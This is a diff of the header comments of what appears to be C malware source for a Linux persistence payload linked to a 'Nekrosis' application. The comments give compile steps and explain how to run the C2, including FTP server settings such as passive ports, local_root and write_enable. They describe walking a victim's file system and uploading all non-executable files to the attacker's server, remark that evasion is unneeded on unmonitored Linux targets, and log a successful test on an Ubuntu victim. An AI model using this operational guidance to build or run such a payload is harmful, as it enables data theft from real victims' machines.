@@ -8,29 +8,42 @@
 #include <time.h>
 #include <unistd.h>
 
-/* Compilation: 				--> Compiling with header files turned into a nightmare, enjoy this monolithic beast
+// Author: Ezra Fast
+
+/* COMPILATION: 				--> Compiling with header files turned into a nightmare, enjoy this monolithic beast!
  * sudo apt install libcurl4-openssl-dev
  * gcc main.c -o main -lcurl
 */
 
-/* Supported Directives:
+/* SUPPORTED DIRECTIVES:
  * - COPY
 */
 
-/* Operating the C2:
- * Leave the directive in "instruction.txt" and serve at CADDRESS as shown below. Same goes for username and password in their respective files listed below.
- * The configuration of the FTP is quite sensitive:
- * 	- unless the server itself is facing the internet, the passive mode port needs to be declared and forwarded to the internet (pasv_min_port and pasv_max_port)
- * 	- The root directory of the user used to login to the server should be set to the directory that will contain the stolen files. That is why only the file is specified in the FTP link (local_root)
+/* OPERATING THE C2:
+ * Leave the control directive in "instruction.txt" and serve at CADDRESS as shown below. You also need to serve valid FTP credentials as shown in the global variable declarations.
+ * 
+ * The configuration of the VSFTPD server has a few sensitivities:
+ * 	- unless the server itself is facing the internet, the passive mode port needs to be declared and forwarded to the internet (pasv_min_port and pasv_max_port) along with the listening port
+ * 	- The root directory of the user used to login to the FTP server should be set to the directory that shall contain the stolen files. That is why only the file is specified in the FTP link (local_root)
  * 	- The server must be configured to allow authenticated users to perform write operations (write_enable)
+ * 
+ * The structure of the victim's file system is not maintained. All files are copied into the FTP user's root directory. Each copied file is prefixed with a short sequence of pseudo-random
+ * characters so that duplicate file names do not cause issues.
+ *
+ * Executable files are not copied from the victim to the C2. They considerably increase the overhead of the attack and present very little value when compared to text-based files.
 */
 
-/* 
- * This is a pure C payload meant to target Linux systems in an effort to establish persistence. 
- * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and copy all writable files.
+/* DESCRIPTION:
+ * This is a pure C payload meant to target Linux systems in an effort to establish persistence. It was made to be used in conjunction with the Nekrosis application.
+ * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and copy all non-executable files.
  * 
- * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in many cases as many Linux targets do not have monitoring solutions.
+ * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in most cases as many Linux targets do not have monitoring solutions.
 */
+
+/* TESTING:
+ * Always test before deployment.
+ * Friday, February 23, 2024: This payload was successfully tested on an Ubuntu 22.04 LTS Victim with a VSFTPD server receiving the results over the public internet.
+ * */
 
 // Prototypes:
 
